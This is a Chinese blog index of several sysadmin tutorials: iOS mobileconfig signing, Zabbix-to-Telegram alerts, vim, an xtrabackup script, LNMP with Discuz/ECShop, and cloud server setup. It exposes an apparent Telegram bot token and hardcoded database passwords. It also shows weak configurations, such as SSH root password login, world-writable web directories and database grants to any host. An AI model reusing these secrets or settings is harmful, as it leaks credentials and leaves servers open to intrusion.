s：颁发者信息值。-text：打印出S/MIME邮件的各个部件。-CApath directory：设置信任CA文件所在路径，此路径中的ca文件名采用特殊的形式：xxx.0，其中xxx为CA证书持有者的哈希值，它通过x509 -hash命令获得。-CAfile filename：某文件，里面是所有你信任的CA的证书的内容。当你要建立client的证书链的时候也需要用到这个文件。-crl_check、-crl_check_all：检查客户端的证书是否在CA的废除列表中。CRL（s）在证书文件中。crl_check_all表示要检查所有的CA证书中的废除列表。-indef、-stream：这两个选项对I/O流进行编码操作。-noindef：不对数据进行编码操作。-md digest：当签名或放弃签名操作时用的摘要算法。默认的摘要算法为sha1。-rand file(s)：指定随机数种子文件，多个文件间用分隔符分开，windows用“;”，OpenVMS用“,“，其他系统用“：”。cert.pem：提供者的证书信息。-des, -des3, -seed, -rc2-40, -rc2-64, -rc2-128, -aes128, -aes192, -aes256，-camellia128, -camellia192, -camellia256：指定的私钥保护加密算法。默认的算法是rc2-40。退出代码：返回值如下：0：操作成功。1：命令选项中有一个错误产生。2：输入文件中的文件有一个不能读取。3：在创建PKCS#7文件或读取MIME格式消息时出错。4：解密或验证签名时出现错误。5：消息已经被验证但是一个错误发生。 直接执行这里就可以，上面的命令只是解释。 输入私钥密码1openssl rsa -in mbaike.key -out mbaikenopass.key 写入签名1openssl smime -sign -in unsigned.mobileconfig -out signed.mobileconfig -signer mbaike.crt -inkey mbaikenopass.key -certfile ca-bundle.pem -outform der -nodetach 然后直接放到网站上给用户下载就可以啦！","link":"/2020/08/05/win10%E4%B8%BAapp%E7%94%9F%E6%88%90ios_webclip%E5%85%8D%E7%AD%BE/"},{"title":"zabbix-telegram报警","text":"1.配置telegram机器人环境安装好的 zabbix-server 和 zabbix-agent 先去注册一个机器人获取api接口 创建个群组 把机器人拉进去 第一次获取ok信息， 群组中发条消息 重新打开 获取相关信息 刷新获取信息 2.进入容器配置python脚本123456[root@localhost ~]# docker exec -it -u root zabbix-server-mysql bash#查看脚本路径位置bash-5.0# cat /etc/zabbix/zabbix_server.conf |grep AlertScriptsPath= AlertScriptsPath=${datadir}/zabbix/alertscriptsAlertScriptsPath=/usr/lib/zabbix/alertscripts 下载依赖工具 1234bash-5.0# apk add gitbash-5.0# apk updatebash-5.0# apk add pythonbash-5.0# apk add py2-pip 这段忽略 123456789101112&lt;&lt; -- 没有相关文件可以先复制docker cp /root/Zabbix-in-Telegram zabbix-server-mysql:/usr/lib/zabbix/alertscripts/以root权限进入docker exec -it -u root zabbix-server-mysql bashln -s /usr/lib/zabbix/alertscripts/Zabbix-in-Telegram/zbxtg.py /usr/lib/zabbix/alertscripts/Zabbix-in-Telegram/zbxtg_group.py创建软连接bash-5.0# pwd/usr/lib/zabbix/alertscripts/Zabbix-in-Telegram --&gt;&gt; 下载telegram脚本 12345678910111213bash-5.0# cd /usr/lib/zabbix/alertscripts/bash-5.0# git clone https://github.com/ableev/Zabbix-in-Telegram.gitbash-5.0# cd Zabbix-in-Telegram/bash-5.0# pip install -r requirements.txt bash-5.0# cp zbxtg.py zbxtg_settings.example.py zbxtg_group.py ../bash-5.0# pwd/usr/lib/zabbix/alertscriptsbash-5.0# mv zbxtg_settings.example.py zbxtg_settings.pybash-5.0# vi zbxtg_settings.py 主要以下几部分 12345tg_key = &quot;709759784:AAF2Tff_lKOBLIXHPzfoM1WHQkXt-SqkAqo&quot; # telegram bot api keyzbx_server = &quot;http://www.linuxea.com/zabbix/&quot; # zabbix server full urlzbx_api_user = &quot;Admin&quot;zbx_api_pass = &quot;zabbix&quot; 如果显示不了图形把这个修改为zabbix-web-nginx-mysql的地址，现在的端口改为8080了，需要添加端口 1zbx_server = &quot;http://192.168.224.11:8080&quot; 3.配置zabbix web 报警媒介类型。123456zbxtg_group.py{ALERT.SENDTO}{ALERT.SUBJECT}{ALERT.MESSAGE}--group 配置用户，报警媒介。 测试消息能否正常发出 注意，收件人填写bot机器人在的群名字，否者消息会发送不成功。 配置动作，选择触发器 新版zabbix已经可以不用这样配置了。 配置操作。 12345678910111213{{fire}}{{fire}}{{fire}} 报警节点：{TRIGGER.NAME}报警信息：{TRIGGER.NAME}问题详情：{ITEM.NAME}:{ITEM.VALUE}报警主机：{HOST.NAME}报警时间：{EVENT.DATE} {EVENT.TIME}报警等级：{TRIGGER.SEVERITY}报警项目：{TRIGGER.KEY1}当前状态：{TRIGGER.STATUS}:{ITEM.VALUE}事件ID： {EVENT.ID}zbxtg;graphszbxtg;graphs_period=10800zbxtg;itemid:{ITEM.ID1}zbxtg;title:{TRIGGER.NAME} 123456789101112131415恢复操作{{OK}}{{OK}}{{OK}}: 恢复节点 : {TRIGGER.NAME}报警信息：{TRIGGER.NAME}问题详情：{ITEM.NAME}:{ITEM.VALUE}报警主机：{HOST.NAME}报警时间：{EVENT.DATE} {EVENT.TIME}报警等级：{TRIGGER.SEVERITY}报警项目：{TRIGGER.KEY1}当前状态：{TRIGGER.STATUS}:{ITEM.VALUE}事件ID： {EVENT.ID}zbxtg;graphszbxtg;graphs_period=10800zbxtg;itemid:{ITEM.ID1}zbxtg;title:{TRIGGER.NAME} 新版本直接在报警媒介类型里添加就可以了。 12345678[root@localhost yum.repos.d]# systemctl start sshd[root@localhost yum.repos.d]# systemctl start httpd#客户端安装zabbix源rpm -Uvh https://repo.zabbix.com/zabbix/4.4/rhel/7/x86_64/zabbix-release-4.4-1.el7","link":"/2020/08/03/zabbix-telegram%E6%8A%A5%E8%AD%A6/"},{"title":"vim的使用","text":"Linux vi/vim所有的 Unix Like 系统都会内建 vi 文书编辑器，其他的文书编辑器则不一定会存在。 但是目前我们使用比较多的是 vim 编辑器。 vim 具有程序编辑的能力，可以主动的以字体颜色辨别语法的正确性，方便程序设计。 什么是 vim？Vim是从 vi 发展出来的一个文本编辑器。代码补完、编译及错误跳转等方便编程的功能特别丰富，在程序员中被广泛使用。 简单的来说， vi 是老式的字处理器，不过功能已经很齐全了，但是还是有可以进步的地方。 vim 则可以说是程序开发者的一项很好用的工具。 连 vim 的官方网站 (http://www.vim.org) 自己也说 vim 是一个程序开发工具而不是文字处理软件。 vi/vim 的使用基本上 vi/vim 共分为三种模式，分别是命令模式（Command mode），输入模式（Insert mode）和底线命令模式（Last line mode）。 这三种模式的作用分别是： 命令模式：用户刚刚启动 vi/vim，便进入了命令模式。 此状态下敲击键盘动作会被Vim识别为命令，而非输入字符。比如我们此时按下i，并不会输入一个字符，i被当作了一个命令。 以下是常用的几个命令： i 切换到输入模式，以输入字符。 x 删除当前光标所在处的字符。 : 切换到底线命令模式，以在最底一行输入命令。 若想要编辑文本：启动Vim，进入了命令模式，按下i，切换到输入模式。 命令模式只有一些最基本的命令，因此仍要依靠底线命令模式输入更多命令。 输入模式在命令模式下按下i就进入了输入模式。 在输入模式中，可以使用以下按键： 字符按键以及Shift组合，输入字符 ENTER，回车键，换行 BACK SPACE，退格键，删除光标前一个字符 DEL，删除键，删除光标后一个字符 方向键，在文本中移动光标 HOME/END，移动光标到行首/行尾 Page Up/Page Down，上/下翻页 Insert，切换光标为输入/替换模式，光标将变成竖线/下划线 ESC，退出输入模式，切换到命令模式 底线命令模式在命令模式下按下:（英文冒号）就进入了底线命令模式。 底线命令模式可以输入单个或多个字符的命令，可用的命令非常多。 在底线命令模式中，基本的命令有（已经省略了冒号）： q 退出程序 w 保存文件 按ESC键可随时退出底线命令模式。 简单的说，我们可以将这三个模式想成底下的图标来表示 vi/vim 使用实例使用 vi/vim 进入一般模式如果你想要使用 vi 来建立一个名为 runoob.txt 的文件时，你可以这样做： 1$ vim runoob.txt 直接输入 vi 文件名 就能够进入 vi 的一般模式了。请注意，记得 vi 后面一定要加文件名，不管该文件存在与否！ 按下 i 进入输入模式(也称为编辑模式)，开始编辑文字在一般模式之中，只要按下 i, o, a 等字符就可以进入输入模式了！ 在编辑模式当中，你可以发现在左下角状态栏中会出现 –INSERT- 的字样，那就是可以输入任意字符的提示。 这个时候，键盘上除了 Esc 这个按键之外，其他的按键都可以视作为一般的输入按钮了，所以你可以进行任何的编辑。 按下 ESC 按钮回到一般模式好了，假设我已经按照上面的样式给他编辑完毕了，那么应该要如何退出呢？是的！没错！就是给他按下 Esc 这个按钮即可！马上你就会发现画面左下角的 – INSERT – 不见了！ 在一般模式中按下 :wq 储存后离开 viOK，我们要存档了，存盘并离开的指令很简单，输入 :wq 即可保存离开！ vi/vim 按键说明除了上面简易范例的 i, Esc, :wq 之外，其实 vim 还有非常多的按键可以使用。 第一部分：一般模式可用的光标移动、复制粘贴、搜索替换等在行首添加 1:%s/^/内容/g 在行尾添加 12:%s/$/内容/g:%s/$/\\@qq\\.com/g #特殊内容需要转义 删除空格行 1:g/^$/d 删除行首空格 1:%s/^\\s*//g 删除行尾空格 1:%s/\\s*$//g VIM删除空白行 12345678:g/^\\s*$/d:g 代表在全文档范围内^代表行的开始\\s*代表空白字符$代表行的结束d代表删除用//将3段代码隔开 移动光标的方法 h 或 向左箭头键(←) 光标向左移动一个字符 j 或 向下箭头键(↓) 光标向下移动一个字符 k 或 向上箭头键(↑) 光标向上移动一个字符 l 或 向右箭头键(→) 光标向右移动一个字符 如果你将右手放在键盘上的话，你会发现 hjkl 是排列在一起的，因此可以使用这四个按钮来移动光标。 如果想要进行多次移动的话，例如向下移动 30 行，可以使用 “30j” 或 “30↓” 的组合按键， 亦即加上想要进行的次数(数字)后，按下动作即可！ [Ctrl] + [f] 屏幕『向下』移动一页，相当于 [Page Down]按键 (常用) [Ctrl] + [b] 屏幕『向上』移动一页，相当于 [Page Up] 按键 (常用) [Ctrl] + [d] 屏幕『向下』移动半页 [Ctrl] + [u] 屏幕『向上』移动半页 + 光标移动到非空格符的下一行 - 光标移动到非空格符的上一行 n 那个 n 表示『数字』，例如 20 。按下数字后再按空格键，光标会向右移动这一行的 n 个字符。例如 20 则光标会向后面移动 20 个字符距离。 0 或功能键[Home] 这是数字『 0 』：移动到这一行的最前面字符处 (常用) $ 或功能键[End] 移动到这一行的最后面字符处(常用) H 光标移动到这个屏幕的最上方那一行的第一个字符 M 光标移动到这个屏幕的中央那一行的第一个字符 L 光标移动到这个屏幕的最下方那一行的第一个字符 G 移动到这个档案的最后一行(常用) nG n 为数字。移动到这个档案的第 n 行。例如 20G 则会移动到这个档案的第 20 行(可配合 :set nu) gg 移动到这个档案的第一行，相当于 1G 啊！ (常用) n n 为数字。光标向下移动 n 行(常用) 搜索替换 /word 向光标之下寻找一个名称为 word 的字符串。例如要在档案内搜寻 vbird 这个字符串，就输入 /vbird 即可！ (常用) ?word 向光标之上寻找一个字符串名称为 word 的字符串。 n 这个 n 是英文按键。代表重复前一个搜寻的动作。举例来说， 如果刚刚我们执行 /vbird 去向下搜寻 vbird 这个字符串，则按下 n 后，会向下继续搜寻下一个名称为 vbird 的字符串。如果是执行 ?vbird 的话，那么按下 n 则会向上继续搜寻名称为 vbird 的字符串！ N 这个 N 是英文按键。与 n 刚好相反，为『反向』进行前一个搜寻动作。 例如 /vbird 后，按下 N 则表示『向上』搜寻 vbird 。 使用 /word 配合 n 及 N 是非常有帮助的！可以让你重复的找到一些你搜寻的关键词！ :n1,n2s/word1/word2/g n1 与 n2 为数字。在第 n1 与 n2 行之间寻找 word1 这个字符串，并将该字符串取代为 word2 ！举例来说，在 100 到 200 行之间搜寻 vbird 并取代为 VBIRD 则： 『:100,200s/vbird/VBIRD/g』。(常用) :1,$s/word1/word2/g 或 :%s/word1/word2/g 从第一行到最后一行寻找 word1 字符串，并将该字符串取代为 word2 ！(常用) :1,$s/word1/word2/gc 或 :%s/word1/word2/gc 从第一行到最后一行寻找 word1 字符串，并将该字符串取代为 word2 ！且在取代前显示提示字符给用户确认 (confirm) 是否需要取代！(常用) 删除、复制与贴上 x, X 在一行字当中，x 为向后删除一个字符 (相当于 [del] 按键)， X 为向前删除一个字符(相当于 [backspace] 亦即是退格键) (常用) nx n 为数字，连续向后删除 n 个字符。举例来说，我要连续删除 10 个字符， 『10x』。 dd 删除游标所在的那一整行(常用) ndd n 为数字。删除光标所在的向下 n 行，例如 20dd 则是删除 20 行 (常用) d1G 删除光标所在到第一行的所有数据 dG 删除光标所在到最后一行的所有数据 d$ 删除游标所在处，到该行的最后一个字符 d0 那个是数字的 0 ，删除游标所在处，到该行的最前面一个字符 yy 复制游标所在的那一行(常用) nyy n 为数字。复制光标所在的向下 n 行，例如 20yy 则是复制 20 行(常用) y1G 复制游标所在行到第一行的所有数据 yG 复制游标所在行到最后一行的所有数据 y0 复制光标所在的那个字符到该行行首的所有数据 y$ 复制光标所在的那个字符到该行行尾的所有数据 p, P p 为将已复制的数据在光标下一行贴上，P 则为贴在游标上一行！ 举例来说，我目前光标在第 20 行，且已经复制了 10 行数据。则按下 p 后， 那 10 行数据会贴在原本的 20 行之后，亦即由 21 行开始贴。但如果是按下 P 呢？ 那么原本的第 20 行会被推到变成 30 行。 (常用) J 将光标所在行与下一行的数据结合成同一行 c 重复删除多个数据，例如向下删除 10 行，[ 10cj ] u 复原前一个动作。(常用) [Ctrl]+r 重做上一个动作。(常用) 这个 u 与 [Ctrl]+r 是很常用的指令！一个是复原，另一个则是重做一次～ 利用这两个功能按键，你的编辑，嘿嘿！很快乐的啦！ . 不要怀疑！这就是小数点！意思是重复前一个动作的意思。 如果你想要重复删除、重复贴上等等动作，按下小数点『.』就好了！ (常用) 第二部分：一般模式切换到编辑模式的可用的按钮说明 进入输入或取代的编辑模式 i, I 进入输入模式(Insert mode)： i 为『从目前光标所在处输入』， I 为『在目前所在行的第一个非空格符处开始输入』。 (常用) a, A 进入输入模式(Insert mode)： a 为『从目前光标所在的下一个字符处开始输入』， A 为『从光标所在行的最后一个字符处开始输入』。(常用) o, O 进入输入模式(Insert mode)： 这是英文字母 o 的大小写。o 为『在目前光标所在的下一行处输入新的一行』； O 为在目前光标所在处的上一行输入新的一行！(常用) r, R 进入取代模式(Replace mode)： r 只会取代光标所在的那一个字符一次；R会一直取代光标所在的文字，直到按下 ESC 为止；(常用) 上面这些按键中，在 vi 画面的左下角处会出现『–INSERT–』或『–REPLACE–』的字样。 由名称就知道该动作了吧！！特别注意的是，我们上面也提过了，你想要在档案里面输入字符时， 一定要在左下角处看到 INSERT 或 REPLACE 才能输入喔！ [Esc] 退出编辑模式，回到一般模式中(常用) 第三部分：一般模式切换到指令行模式的可用的按钮说明 指令行的储存、离开等指令 :w 将编辑的数据写入硬盘档案中(常用) :w! 若文件属性为『只读』时，强制写入该档案。不过，到底能不能写入， 还是跟你对该档案的档案权限有关啊！ :q 离开 vi (常用) :q! 若曾修改过档案，又不想储存，使用 ! 为强制离开不储存档案。 注意一下啊，那个惊叹号 (!) 在 vi 当中，常常具有『强制』的意思～ :wq 储存后离开，若为 :wq! 则为强制储存后离开 (常用) ZZ 这是大写的 Z 喔！若档案没有更动，则不储存离开，若档案已经被更动过，则储存后离开！ :w [filename] 将编辑的数据储存成另一个档案（类似另存新档） :r [filename] 在编辑的数据中，读入另一个档案的数据。亦即将 『filename』 这个档案内容加到游标所在行后面 :n1,n2 w [filename] 将 n1 到 n2 的内容储存成 filename 这个档案。 :! command 暂时离开 vi 到指令行模式下执行 command 的显示结果！例如 『:! ls /home』即可在 vi 当中察看 /home 底下以 ls 输出的档案信息！ vim 环境的变更 :set nu 显示行号，设定之后，会在每一行的前缀显示该行的行号 :set nonu 与 set nu 相反，为取消行号！ 特别注意，在 vi/vim 中，数字是很有意义的！数字通常代表重复做几次的意思！ 也有可能是代表去到第几个什么什么的意思。 举例来说，要删除 50 行，则是用 『50dd』 对吧！ 数字加在动作之前，如我要向下移动 20 行呢？那就是『20j』或者是『20↓』即可。","link":"/2020/08/03/vim%E4%BD%BF%E7%94%A8/"},{"title":"xtrabackup8.0周增量备份脚本","text":"xtrabackup8.0周增量备份脚本下面是脚本内容 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#!/bin/bashyum -y install wget lrzsz &gt;&gt;/dev/null#今天Date_today=$(date &quot;+%w&quot;)#昨天Yester_day=$(date &quot;+%w&quot; -d '1 day ago')#七天前Sevendays_ago=$(date &quot;+%w&quot; -d '7 day ago')#今天星期几week=`date +%w`mysqluser=&quot;root&quot;mysqlpass=&quot;123.Shui!!&quot;mysqlcon=/etc/my.cnfhost=&quot;192.168.224.11&quot;first=`date &quot;+%Y-%m-%d&quot;`if [ $first = 2020-07-21 ];then yum install -y https://repo.percona.com/yum/percona-release-latest.noarch.rpm &amp;&gt;/dev/null percona-release enable-only tools release yum install -y percona-xtrabackup-80 qpress &amp;&gt; /dev/null mkdir -p /mysqlbackup/{wanquan,zengliang}fi#判断今天是不是周日 如果是周日进行全量备份if [ $week -eq 0 ];then rm -rf /mysqlbackup/wanquan/$Sevendays_ago &gt;&gt;/dev/null xtrabackup --backup --default-file=${mysqlcon} --target-dir=/mysqlbackup/wanquan/$Date_today --user=${mysqluser} --host=${host} --password=${mysqlpass} if [ $? -eq 0 ];then rm -rf /mysqlbackup/zengliang/* fielse dir=`ls /mysqlbackup/zengliang/ | wc -l | awk '{print $1}'` if [ $dir -eq 0 ];then xtrabackup --backup --default-file=${mysqlcon} --target-dir=/mysqlbackup/zengliang/$Date_today --incremental-basedir=/mysqlbackup/wanquan/`ls /mysqlbackup/wanquan/` --user=${mysqluser} --host=${host} --password=${mysqlpass} else xtrabackup --backup --default-file=${mysqlcon} --target-dir=/mysqlbackup/zengliang/$Date_today --incremental-basedir=/mysqlbackup/zengliang/${Yester_day} --user=${mysqluser} --host=${host} --password=${mysqlpass} fifi 这脚本只适合本地安装本地备份，不适合docker安装的","link":"/2020/08/03/xtrabackup8.0%E5%91%A8%E5%A2%9E%E9%87%8F%E5%A4%87%E4%BB%BD/"},{"title":"lnmp架构搭建","text":"1.lnmp搭建1.安装lnmp相关包 安装php 官方文档 1https://www.php.net/manual/zh/install.unix.debian.php 下载源 1rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm 安装默认的php相关包 1yum install php php-mysql php-gd libjpeg\\* php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring php-bcmath php-mhash php-fpm php-pecl-zendopcache -y 安装指定版本PhP 1yum install -y php72w php72w-mysql php72w-gd php72w-ldap php72w-odbc php72w-pear php72w-xml php72w-xmlrpc php72w-mbstring php72w-bcmath php72w-fpm php72w-pecl-zendopcache libjpeg\\* 我这里安装5.6的php 1yum install -y php55w php55w-mysql php55w-gd php55w-ldap php55w-odbc php55w-pear php55w-xml php55w-xmlrpc php55w-mbstring php55w-bcmath php55w-fpm php55w-pecl-zendopcache libjpeg\\* 查看是否安装成功 1rpm -qa|grep php 安装nginx 1yum install -y nginx 安装数据库 我这里安装mariadb 1yum install -y mariadb mariadb-server 启动mariadb，并登录验证 1234567systemctl start mariadb.servicesystemctl enable mariadb.servicesystemctl status mariadb.service设置新密码mysqladmin password '123.yichen'然后登陆验证。 确认php安装模块(modules)，并按需求进行模块的增加或删除,对php配置文件进行优化（可选) php -m –查看已经安装的php模块，如果还有需要的模块没有安装，则使用yum install php-xxx去安装相应的模块 123 ls /usr/lib64/php/modules/ #所有安装的模块路么都在此目录下 vim /etc/php.ini #php主配置文件，如果要进行相应的优化修改或者是以源码编译的方式编出的模块需要加到php里的都需要修改此配置文件 2.优化php-fpm 优化php-fpm，并启动(php-fpm为php的fastcgi模式，简单来说就是php的服务模式) 12345678910111213141516171819 vim /etc/php-fpm.d/www.conf #打开php-fpm主配置文件并进行优化(以下优化在生产环境视具体情况而定) 12 listen = /var/run/php-fpm/fastcgi.socket #原来是监听127.0.0.1:9000也是可以的，我这里换成socket来做(本机连接可以使用socket或tcp/ip协议方式，远程连接只能使用tcp/ip协议方式)31 listen.owner = nginx32 listen.group = nginx #socket文件的权限设置。用户与组和跑nginx服务的用户一致，避免权限问题（如果前面使用的是tcp/ip的方式，这里就注释就好)33 listen.mode = 066639 user = nginx #用户与组和跑nginx服务的用户一致，避免权限问题 41 group = nginx60 pm = dynamic #对于专用服务器，pm可以设置为static。如果选择static，则由pm.max_children指定固定的子进程数。如果选择dynamic,则可以动态调整下面几个参数70 pm.max_children = 64 #子进程最大数,我这里只是参考值（看系统资源决定，视实际环境测试后调整，下几个参数也一样）75 pm.start_servers = 20 #启动时默认启动的进程数80 pm.min_spare_servers = 5 #保证空闲进程数最小值，如果空闲进程小于此值，则创建新的子进程85 pm.max_spare_servers = 35 #保证空闲进程数最大值，如果空闲进程大于此值，此进行清理160 rlimit_files = 65535 #打开的文件描述符数量，不能大于系统的限制（系统可以使用ulimit命令查看和设置，后面有例子)218 php_flag[display_errors] = on #打开php错误显示功能 修改php-fpm的权限 1chown nginx.nginx /var/run/php-fpm/ -R 设置系统打开的文件描述符数量，与上面的配置对应 12345ulimit -nulimit -SHn 65535echo &quot;ulimit -SHn 65535&quot; &gt;&gt; /etc/rc.local （设置永久生效） 启动php-fpm服务 123systemctl start php-fpm.servicesystemctl status php-fpm.service systemctl enable php-fpm.service 3.配置nginx nginx的配置文件的一个基本结构如下: 1234567891011121314 全局配置（如跑服务进程的用户,启动进程数,log,pid等)events { 事件（优化并发数，网络IO模型选择）}http {针对所有server的全局配置server { 虚拟主机一 } server {虚拟主机二}} 我这里的配置结果如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465 cat /etc/nginx/nginx.conf |grep -v '#' user nginx;worker_processes auto;error_log /var/log/nginx/error.log;pid /run/nginx.pid;include /usr/share/nginx/modules/*.conf;events { worker_connections 65535;}http { log_format main '$remote_addr - $remote_user [$time_local] &quot;$request&quot; ' '$status $body_bytes_sent &quot;$http_referer&quot; ' '&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;'; access_log /var/log/nginx/access.log main; sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; include /etc/nginx/mime.types; default_type application/octet-stream; include /etc/nginx/conf.d/*.conf; server { listen 80 default_server; listen [::]:80 default_server; server_name server2.com; root /usr/share/nginx/html; index index.php index.html; include /etc/nginx/default.d/*.conf; location / { } location ~\\.php$ { fastcgi_pass 127.0.0.1:9000; #表示转发到本地的9000端口php处理此类文件 fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; include /etc/nginx/fastcgi.conf;} error_page 404 /404.html; location = /40x.html { } error_page 500 502 503 504 /50x.html; location = /50x.html { } }}如果上面监听方式是socket的话，转发的位置就应该是下面的方式。 listen = /var/run/php-fpm/fastcgi.socketfastcgi_pass unix:/var/run/php-fpm/fastcgi.socket; 启动nginx服务 12345systemctl start nginx.service #80端口不要被其它服务（如httpd）占用了systemctl enable nginx.servicesystemctl status nginx.service curl -I 127.0.0.1 #(访问本机80端口，验证Nginx服务) 4.测试nginx工作是否支持PHP 在nginx家目录里加上php测试页 12345 vim /usr/share/nginx/html/test.php &lt;?php phpinfo();?&gt; 在浏览器输入地址 123http://yichen2.com/http://yichen2.com/test.php 如果有出现php的版本信息，说明架构搭建好了。 2.安装discuz论坛并测试1,解压discuz到nginx家目录 12345678mkdir /usr/share/nginx/html/discuz/unzip Discuz_X3.3_SC_UTF8.zip -d /usr/share/nginx/html/discuz/cd /usr/share/nginx/html/discuz/mv upload/* ./ rm upload/ -rf 环境检查这一步，有些目录和文件权限需要修改(下面直接使用简单方式全改成nginx的owner和group) 1chown nginx.nginx /usr/share/nginx/html/discuz -R 2.mariadb数据库授权 123456mysql -pMariaDB [(none)]&gt; create database discuz; #创建一个库，用于存放将要安装的discuz论坛的表MariaDB [(none)]&gt; grant all on discuz.* to 'discuz'@'%' identified by '123'; #授权一个用户，用于discuz论坛程序连接mysqlMariaDB [(none)]&gt; flush privileges; 3.开始访问 123456789101112http://yichen2.com/discuz/填上对应的数据库地址,库,用户,密码。开始安装 On web page wizard: 选择：全新安装 Discuz! X (含 UCenter Server) 数据库名:discuz 数据库用户名：discuz 数据库密码：123 管理员密码：123 重复密码：123如果发现权限不可写，把权限改下就可以了。chmod o+w /usr/share/nginx/html/discuz/* -R 4.测试论坛 1234http://yichen2.com/discuz/forum.php 测试论坛HTML学习资源：http://www.w3school.com.cn/html/index.aspPHP学习资源：http://www.w3school.com.cn/php/index.asp 3.安装ECSHOP1.ECSHOP包上传到服务器部署 123456789101112mkdir /usr/share/nginx/html/ecshop解压unzip ECShop_V4.0.6_UTF8.zip -d /usr/share/nginx/html/ecshopcd /usr/share/nginx/html/ecshoppwd/usr/share/nginx/html/ecshop[root@k8snode2 ecshop]# lsappserver ecshop保证服务端(appserver)与ecshop在同一目录。 设置权限 12chown nginx.nginx /usr/share/nginx/html/ecshop -Rchmod o+w /usr/share/nginx/html/ecshop/ -R 2.数据库授权 123456mysql -pMariaDB [(none)]&gt; create database ecshop; #创建一个库，用于存放将要安装的discuz论坛的表MariaDB [(none)]&gt; grant all on ecshop.* to 'ecshop'@'%' identified by '123'; #授权一个用户，用于ecshop程序连接mysqlMariaDB [(none)]&gt; flush privileges; 3.配置nginx 1234567891011121314151617181920212223242526272829vim /etc/nginx/conf.d/ecshop.confserver { listen 80; server_name test2.com ; index index.php index.html; root /usr/share/nginx/html/ecshop/; location / { try_files $uri $uri/ /index.php?$args; } location ~ [^/]\\.php(/|$) { try_files $uri =404; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi.conf; } location ~ .*\\.(gif|jpg|jpeg|png|bmp|swf)$ { expires 30d; } location ~ .*\\.(js|css)?$ { expires 12h; } } 2.1.为API创建一个配置文件 复制一份刚才配置完成的ecshop.conf文件，命名为h5api.conf 1cp /etc/nginx/conf.d/ecshop.conf /etc/nginx/conf.d/h5api.conf 编辑h5api.conf文件 修改server_name 为你的站点api域名。api.test2.com 修改root 为你上传时appserver/public所在的位置。 1root /usr/share/nginx/html/ecshop/appserver/public; 保存修改。 修改完成后重载Ngin配置或者重启Nginx服务，生效。 3.检验API配置是否成功 浏览器输入您的API地址api.test2.com，若结果显示Hi则表示配置成功 1http://ipa.test2.com/ 4.系统安装 浏览器输入域名进入ecshop安装界面，根据系统提示填写相关配置信息，安装成功后请用云起账号激活系统。（注：如有自定义API子域名、修改Appserver、H5文件夹名称或路径，请手动修改配置信息） 若之前www 与api的域名解析已成功，配置符合第四章节要求，无需进行以下手动配置，安装时会自动配置成功。 1http://test2.com/ecshop/install/ 填写相关数据库信息 如果localhost连接不上的话，先看下是什么问题。测试下 123 &lt;?phpvar_dump(mysql_connect('localhost','root','123.yichen'));?&gt; 然后就修改下/etc/php.ini 12把sock的默认值修改成这个。1103行。mysql.default_socket =/var/lib/mysql/mysql.sock 配置时区 123456vim /etc/php.inidate.timezone = PRC然后重启php-fpmsystemctl restart php-fpm 如果有错误信息出现，修改下文件 1234567cd /usr/share/nginx/html/ecshop/ecshop/vim includes/init.php:21行把E_ALL改为0error_reporting(0);@ini_set('display_errors', 0); #错误输出也改成0 把最后判断的部分也注销 12345vim install/includes/init.php这里也改成0@ini_set('display_errors', 0);error_reporting(0);","link":"/2020/08/03/lnmp%E6%90%AD%E5%BB%BA/"},{"title":"一键生成ios端webcli的网站","text":"一个很方便生成ios端wepcli的网站之前有分享过制作webcli的方法，但是有点复杂，需要自己配置证书，那种有效期是1年，现在这种是一键生成的，缺点是有效期只有3个月。 1234567webcli https://ivi.cxname: 逸尘网址url: https://yc6.coolOrganization: 逸尘互娱Install File Name: 逸尘网址Install Description: 逸尘网址 填好信息提交就行了。复制链接访问就可以下载.mobileconfig结尾的文件。","link":"/2022/04/22/%E4%B8%80%E9%94%AE%E7%94%9F%E6%88%90ios%E7%AB%AFwepcli%E7%9A%84%E7%BD%91%E7%AB%99/"},{"title":"云服务器开通","text":"云服务器开通主要是国外云服务器。国内的阿里云腾讯云都比较通俗易懂，就不写文档了。 谷歌云选择服务器 12345678910111213141516171819202122实例名称daohang-hk-test添加标签键 值分类: 营销部门 用途: 财务站点: 北美地区方便查询各项服务器费用明细服务器地区:地区: asia-east2(香港) 区域: asia-east2-b系列E2机器类型:e2-small(2个cpu,2GB内存)操作系统:选择 CentoOS 7磁盘标准就行了 20G防火墙选择网络标记选择对应的如: web 开通后直接通过浏览器ssh连接 123456789101112131415161718192021GCP 启用root登录sudo -i设置root密码（输入时不显示）passwd root然后编辑ssh配置文件（进入后点击i键）vi /etc/ssh/sshd_config找到下面的内容，并修改PermitRootLogin noPasswordAuthentication no(no改为yes，修改完成点击ESC键，输入:wq回车)最后，重启sshservice sshd restart通过sed修改sed -i 's/PermitRootLogin no/PermitRootLogin yes/g' /etc/ssh/sshd_configsed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config然后通过xshell等软件远程连接部署。 完成部署后去谷歌云控制台添加外部静态IP。防止服务器重启后ip变动。 1选择VPC网络 然后选择外部的地址 账号用量查询 1点击结算 查看报告 过滤条件。选择站点 亚马逊云创建秘钥对和安全组 12345678https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/get-set-up-for-amazon-ec2.html每个区域对应不同的秘钥对通过macos或者linux连接需要设置权限。否则秘钥不能生效chmod 400 my-key-pair.pem创建安全组允许所有放行。描述规则必须英文 1.选择服务器 12345678910111213141516171819202122231.选择AMI镜像选择社区AMI 可以按照模板启动实例固定系统版本。centos7.9-AMI部署地址(ARM架构) https://ap-east-1.console.aws.amazon.com/ec2/v2/home?region=ap-east-1#LaunchInstanceWizard:ami=ami-0f18e61452a29247dcentos7.9-AMI部署地址(x86架构) 推荐使用https://ap-east-1.console.aws.amazon.com/ec2/v2/home?region=ap-east-1#LaunchInstanceWizard:ami=ami-09611bd6fa5dd0e3d2.实例类型t3a.small 2vcpu-2GB内存 或者t4g.small 2vcpu-2GB(这是arm架构的)3.配置实例默认就行4.添加存储20GB SSD通用型5. 添加标签键 值分类 